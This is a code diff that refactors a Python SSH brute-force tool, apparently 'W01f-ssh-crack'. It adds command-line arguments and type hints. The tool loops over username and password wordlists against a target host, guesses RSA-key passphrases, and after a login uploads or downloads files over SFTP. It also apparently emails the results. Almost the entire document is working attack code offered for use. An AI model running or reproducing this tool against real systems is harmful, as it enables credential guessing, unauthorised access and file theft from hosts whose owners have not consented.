@@ -1,81 +1,91 @@
 # -*- coding: utf-8
-print("""
-@Author: W01f
-@repo: https://github.com/W01fh4cker/W01f-ssh-crack/
-@version: 1.0
-@time: 2022/4/13
-██╗    ██╗ ██████╗ ██╗     ███████╗      ███████╗███████╗██╗  ██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
-██║    ██║██╔═══██╗██║     ██╔════╝      ██╔════╝██╔════╝██║  ██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
-██║ █╗ ██║██║   ██║██║     █████╗  █████╗███████╗███████╗███████║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
-██║███╗██║██║   ██║██║     ██╔══╝  ╚════╝╚════██║╚════██║██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
-╚███╔███╔╝╚██████╔╝███████╗██║           ███████║███████║██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
- ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝           ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
-                                                                                                               
-""")
 
 import paramiko
 import sys
 import smtplib
 import socket
+import argparse
 import os
 import configparser
 import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.header import Header
+from typing import Callable
 
-type = sys.argv[1]
-hostname = sys.argv[2]
+print("""
+@Author: W01f
+@repo: https://github.com/W01fh4cker/W01f-ssh-crack/
+@version: 1.0
+@time: 2022/4/13
+     ███████╗███████╗██╗  ██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗
+     ██╔════╝██╔════╝██║  ██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
+     ███████╗███████╗███████║█████╗██║     ██████╔╝███████║██║     █████╔╝ 
+     ╚════██║╚════██║██╔══██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
+     ███████║███████║██║  ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
+     ╚══════╝╚══════╝╚═╝  ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+                                                                                                               
+""")
 
-def getConfig(section, key):
+# re coding and fixing bugs by: [KOKOMI12345]Fuxuan(https://github.com/KOKOMI12345)
+
+
+def parseArgs() -> tuple[str, str , str, int]:
+    parser = argparse.ArgumentParser(description='SSH Brute-Force Cracking Tool')
+    parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans")
+    parser.add_argument('--stmpPath', type=str, default='data.conf', help="配置文件路径")
+    parser.add_argument('--hostname', type=str, default='127.0.0.1', help="目标主机IP地址")
+    parser.add_argument('--port', type=int, default=22, help="目标主机SSH端口")
+    args = parser.parse_args()
+    return args.mode , args.stmpPath, args.hostname, args.port
+
+def getConfig(section: str, key: str, stmpPathConf: str) -> str:
     config = configparser.ConfigParser()
-    a = os.path.split(os.path.realpath(__file__))
-    path = 'data.conf'
-    config.read(path)
+    config.read(stmpPathConf)
     return config.get(section, key)
 
-def sshClientConnection():
+def sshClientConnection(hostname:str, SSHport: int):
     ssh_client = paramiko.SSHClient()
     ssh_client.set_missing_host_key_policy(paramiko.WarningPolicy())
     with open("username.txt", 'r', encoding='utf-8') as f:
         user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
         pass_word = f.readlines()
-    for i in user_name:
-        for j in pass_word:
+    for username in user_name:
+        for password in pass_word:
             try:
-                ssh_client.connect(hostname, port=22, username=str(i), password=str(j))
+                ssh_client.connect(hostname, port=SSHport, username=str(username), password=str(password))
                 stdin, stdout, stderr = ssh_client.exec_command('whoami',timeout=10)
                 print(stdout.read().decode('utf-8'))
                 ssh_client.close()
-            except:
+            except Exception:
                 pass
-    print("[√]连接成功！账号：" + str(i) + " 密码为：" + str(j) )
+    print(fr"[√]SSH连接成功! 账号: {username} 密码为：{password}")
 
-def sshRsaConnection():
-    path = input("请输入您的id_rsa文件的绝对路径：")
+def sshRsaConnection(hostname: str, SSHport: int):
+    id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
     flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
     if(flag1 == 'y'):
         with open("username.txt", 'r', encoding='utf-8') as f:
             user_name = f.readlines()
         with open("password.txt", 'r', encoding='utf-8') as f:
             pass_word = f.readlines()
-        for k in pass_word:
-            for l in user_name:
+        for Rsa_password in pass_word:
+            for username in user_name:
                 try:
-                    local_key = paramiko.RSAKey.from_private_key_file('/home/super/.ssh/id_rsa', password=str(k))
+                    local_key = paramiko.RSAKey.from_private_key_file(id_rsa_filePath if id_rsa_filePath is not None else '/home/super/.ssh/id_rsa', password=str(Rsa_password))
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
                     ssh.connect(hostname,
-                                port=22,
-                                username=l,
+                                port=SSHport,
+                                username=username,
                                 pkey=local_key)
                     stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
                     print(stdout.read().decode())
                     ssh.close()
-                except:
+                except Exception:
                     pass
-        print("[√]连接成功！账号：" + str(i) + " 密码为：" + str(j))
+        print(fr"[√]SSH连接成功! 账号：{username} 密码为：{Rsa_password}")
     elif(flag1 == 'n'):
         with open("username.txt", 'r', encoding='utf-8') as f:
             user_name = f.readlines()
@@ -90,11 +100,11 @@ def sshRsaConnection():
             stdin, stdout, stderr = ssh.exec_command('hostname',timeout=10)
             print(stdout.read().decode())
             ssh.close()
-        print("[√]连接成功！账号：" + str(m))
+        print("[√]SSH连接成功！账号：" + str(m))
     else:
         print("您的输入有误！")
 
-def transFile():
+def transFile(hostname: str, SSHport: int):
     with open("username.txt", 'r', encoding='utf-8') as f:
         user_name = f.readlines()
     with open("password.txt", 'r', encoding='utf-8') as f:
@@ -102,12 +112,12 @@ def transFile():
     flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2。")
     if(flag2==1):
         global p,q
-        for p in user_name:
-            for q in pass_word:
+        for username in user_name:
+            for password in pass_word:
                 try:
-                    parameter = (hostname, 22)
+                    parameter = (hostname, SSHport)
                     trans = paramiko.Transport(parameter)
-                    trans.connect(username=p, password=q)
+                    trans.connect(username=username, password=password)
                     sftp = paramiko.SFTPClient.from_transport(trans)
                     local_path = input("请输入您要上传的本地文件的绝对路径：")
                     remote_path = input("请输入您要上传的位置的绝对路径：")
@@ -115,18 +125,18 @@ def transFile():
                         sftp.put(localpath=local_path, remotepath=remote_path)
                         trans.close()
                         print("[√]上传成功！")
-                    except:
+                    except Exception:
                         print("[×]上传失败。")
-                except:
+                except Exception:
                     pass
         print("[√]连接成功！账号：" + str(p) + " 密码为：" + str(q))
     elif(flag2==2):
-        for p in user_name:
-            for q in pass_word:
+        for username in user_name:
+            for password in pass_word:
                 try:
-                    parameter = (hostname,22)
+                    parameter = (hostname, SSHport)
                     trans = paramiko.Transport(parameter)
-                    trans.connect(username=p, password=q)
+                    trans.connect(username=username, password=password)
                     sftp = paramiko.SFTPClient.from_transport(trans)
                     local_path = input("请输入您要保存的位置的绝对路径：")
                     remote_path = input("请输入您要获取的文件的绝对路径：")
@@ -134,10 +144,10 @@ def transFile():
                         sftp.get(localpath=local_path, remotepath=remote_path)
                         print("[√]下载成功！")
                         trans.close()
-                    except:
+                    except Exception:
                         print("[×]下载失败。")
                         trans.close()
-                except:
+                except Exception:
                     pass
     else:
         print("您的输入有误！")
@@ -174,25 +184,36 @@ def send_msg():
     smtp.quit()
 
 if __name__ == '__main__':
-    if type == '-C':
+
+    def print_successmsg():
+        Success_Message = "连接成功！"
+        print(Success_Message)
+
+    def print_errormsg():
+        IfError_Message = "请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！"
+        print(IfError_Message)
+
+    modeDict: dict[str, tuple[Callable]] = {
+        'client': (sshClientConnection, send_msg),
+        'rsa': (sshRsaConnection, send_msg, print_successmsg),
+        'trans': (transFile, send_msg),
+        'default': (print)
+    }
+
+    mode, stmpPath, hostname, SSHport = parseArgs()
+
+    if mode not in modeDict:
+        modeDict['default'](f"模式{mode}不存在！")
+    else:
         try:
-            sshClientConnection()
-            send_msg()
+            if mode == "default":
+                print("请指定模式！")
+                exit(1)
+            modeDict[mode][0](hostname, SSHport)
+            if len(modeDict[mode]) > 1:
+                modeDict[mode][1]()
+            if len(modeDict[mode]) > 2:
+                modeDict[mode][2]()
         except Exception as e:
+            print_errormsg()
             print(e)
-            print("请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！")
-    elif type == '-R':
-        try:
-            sshRsaConnection()
-            send_msg()
-            print("[√]连接成功！")
-        except Exception as e:
-            print(e)
-            print("请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！")
-    elif type== '-T':
-        try:
-            transFile()
-            send_msg()
-        except Exception as e:
-            print(e)
-            print("请先自查您的输入、配置文件填写是否有问题！如果确认无误，请直接发邮件至sharecat2022@gmail.com或者提出issues！")
